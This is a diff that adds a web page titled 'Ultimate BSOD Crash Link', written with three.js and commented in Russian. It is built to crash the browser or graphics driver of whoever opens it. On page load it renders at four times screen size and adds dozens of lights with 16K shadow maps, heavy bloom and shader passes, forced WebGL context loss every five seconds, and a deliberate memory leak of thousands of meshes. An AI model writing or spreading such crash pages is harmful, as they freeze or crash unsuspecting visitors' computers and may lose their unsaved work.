@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<title>💀 Ultimate BSOD Crash Link 💀</title>
+<style>
+  body, html { margin: 0; overflow: hidden; height: 100%; background: black; }
+  canvas { display: block; }
+</style>
+</head>
+<body>
+
+<script src="https://cdn.jsdelivr.net/npm/three@0.152.2/build/three.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/three@0.152.2/examples/js/postprocessing/EffectComposer.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/three@0.152.2/examples/js/postprocessing/RenderPass.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/three@0.152.2/examples/js/postprocessing/UnrealBloomPass.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/three@0.152.2/examples/js/postprocessing/ShaderPass.js"></script>
+
+<script>
+let scene, camera, renderer, composer;
+const meshes = [];
+const speeds = [];
+
+init();
+animate();
+
+function init() {
+  scene = new THREE.Scene();
+
+  const width = window.innerWidth * 4;
+  const height = window.innerHeight * 4;
+
+  camera = new THREE.PerspectiveCamera(75, width / height, 0.1, 10000);
+  camera.position.z = 1200;
+
+  renderer = new THREE.WebGLRenderer({antialias: false});
+  renderer.setSize(width, height);
+  renderer.shadowMap.enabled = true;
+  renderer.shadowMap.type = THREE.PCFSoftShadowMap;
+  document.body.appendChild(renderer.domElement);
+
+  // 150 очень сложных моделей subdivision=6 (~20к треугольников каждая)
+  for(let i = 0; i < 150; i++) {
+    const geo = new THREE.IcosahedronGeometry(40, 6);
+    const mat = new THREE.MeshStandardMaterial({
+      color: new THREE.Color(Math.random(), Math.random(), Math.random()),
+      roughness: 0,
+      metalness: 1,
+      emissive: new THREE.Color(Math.random(), Math.random(), Math.random()),
+      emissiveIntensity: 3
+    });
+    const mesh = new THREE.Mesh(geo, mat);
+    mesh.position.set(
+      (Math.random() - 0.5) * 3000,
+      (Math.random() - 0.5) * 3000,
+      (Math.random() - 0.5) * 3000
+    );
+    mesh.castShadow = true;
+    mesh.receiveShadow = true;
+    scene.add(mesh);
+    meshes.push(mesh);
+    speeds.push(10 + Math.random() * 20); // бешеная скорость вращения
+  }
+
+  // 32 источника света с тенями 16K х 16K — 100% VRAM крах
+  for(let i = 0; i < 32; i++) {
+    const light = new THREE.PointLight(0xffffff, 10, 3000);
+    light.position.set(
+      (Math.random() - 0.5) * 3000,
+      (Math.random() - 0.5) * 3000,
+      (Math.random() - 0.5) * 3000
+    );
+    light.castShadow = true;
+    light.shadow.mapSize.width = 16384;
+    light.shadow.mapSize.height = 16384;
+    scene.add(light);
+  }
+
+  // Directional light с тенями 16К
+  const dirLight = new THREE.DirectionalLight(0xffffff, 10);
+  dirLight.position.set(0, 2000, 2000);
+  dirLight.castShadow = true;
+  dirLight.shadow.mapSize.width = 16384;
+  dirLight.shadow.mapSize.height = 16384;
+  dirLight.shadow.camera.left = -3000;
+  dirLight.shadow.camera.right = 3000;
+  dirLight.shadow.camera.top = 3000;
+  dirLight.shadow.camera.bottom = -3000;
+  dirLight.shadow.camera.near = 0.1;
+  dirLight.shadow.camera.far = 6000;
+  scene.add(dirLight);
+
+  // Постобработка с 2 слоями bloom + очень тяжелый шейдер
+  composer = new THREE.EffectComposer(renderer);
+  composer.setSize(width, height);
+
+  composer.addPass(new THREE.RenderPass(scene, camera));
+
+  const bloom1 = new THREE.UnrealBloomPass(new THREE.Vector2(width, height), 6.0, 2.5, 1.2);
+  composer.addPass(bloom1);
+
+  const bloom2 = new THREE.UnrealBloomPass(new THREE.Vector2(width, height), 8.0, 3.0, 1.5);
+  composer.addPass(bloom2);
+
+  // Тяжеленный кастомный шейдер с 50 итерациями и сложными синусами
+  const HeavyShader = {
+    uniforms: {
+      tDiffuse: { value: null },
+      time: { value: 0 }
+    },
+    vertexShader: `
+      varying vec2 vUv;
+      void main() {
+        vUv = uv; 
+        gl_Position = projectionMatrix * modelViewMatrix * vec4(position, 1.0);
+      }
+    `,
+    fragmentShader: `
+      uniform sampler2D tDiffuse;
+      uniform float time;
+      varying vec2 vUv;
+
+      float complexNoise(vec2 uv) {
+        float n = 0.0;
+        for(int i = 0; i < 50; i++) {
+          float angle = time * 30.0 + float(i) * 6.2831 / 50.0;
+          vec2 offset = vec2(cos(angle), sin(angle)) * 0.005 * float(i);
+          n += sin(uv.x * 1000.0 + offset.x * 500.0) * cos(uv.y * 1000.0 + offset.y * 500.0);
+        }
+        return n / 50.0;
+      }
+
+      void main() {
+        vec4 color = texture2D(tDiffuse, vUv);
+        float noise = complexNoise(vUv + vec2(time * 0.1));
+        color.rgb += noise * 0.8;
+        gl_FragColor = color;
+      }
+    `
+  };
+
+  const heavyPass = new THREE.ShaderPass(HeavyShader);
+  composer.addPass(heavyPass);
+
+  // Принудительный сброс контекста WebGL каждые 5 секунд (драйвера будут нервничать)
+  setInterval(() => {
+    try {
+      renderer.forceContextLoss();
+      console.warn('🔥 Forced WebGL context loss!');
+    } catch(e) {}
+  }, 5000);
+
+  window.addEventListener('resize', onWindowResize);
+
+  // Память-утечка — 10000 геометрий с материалами добавляются по таймеру, тормозя GC и жру VRAM
+  let leakCount = 0;
+  function memoryLeak() {
+    if(leakCount > 10000) return;
+    const geo = new THREE.IcosahedronGeometry(15, 5);
+    const mat = new THREE.MeshStandardMaterial({
+      color: new THREE.Color(Math.random(), Math.random(), Math.random()),
+      roughness: 0.1,
+      metalness: 0.9
+    });
+    const mesh = new THREE.Mesh(geo, mat);
+    mesh.position.set(
+      (Math.random() - 0.5) * 4000,
+      (Math.random() - 0.5) * 4000,
+      (Math.random() - 0.5) * 4000
+    );
+    scene.add(mesh);
+    leakCount++;
+    setTimeout(memoryLeak, 1); // максимально часто
+  }
+  memoryLeak();
+}
+
+function onWindowResize() {
+  const width = window.innerWidth * 4;
+  const height = window.innerHeight * 4;
+  camera.aspect = width / height;
+  camera.updateProjectionMatrix();
+  renderer.setSize(width, height);
+  composer.setSize(width, height);
+}
+
+function animate(time = 0) {
+  requestAnimationFrame(animate);
+
+  for(let i = 0; i < meshes.length; i++) {
+    meshes[i].rotation.x += speeds[i] * 0.15;
+    meshes[i].rotation.y += speeds[i] * 0.2;
+    meshes[i].rotation.z += speeds[i] * 0.12;
+  }
+
+  composer.passes[composer.passes.length - 1].uniforms.time.value = time / 1000;
+
+  composer.render();
+}
+</script>
+
+</body>
+</html>
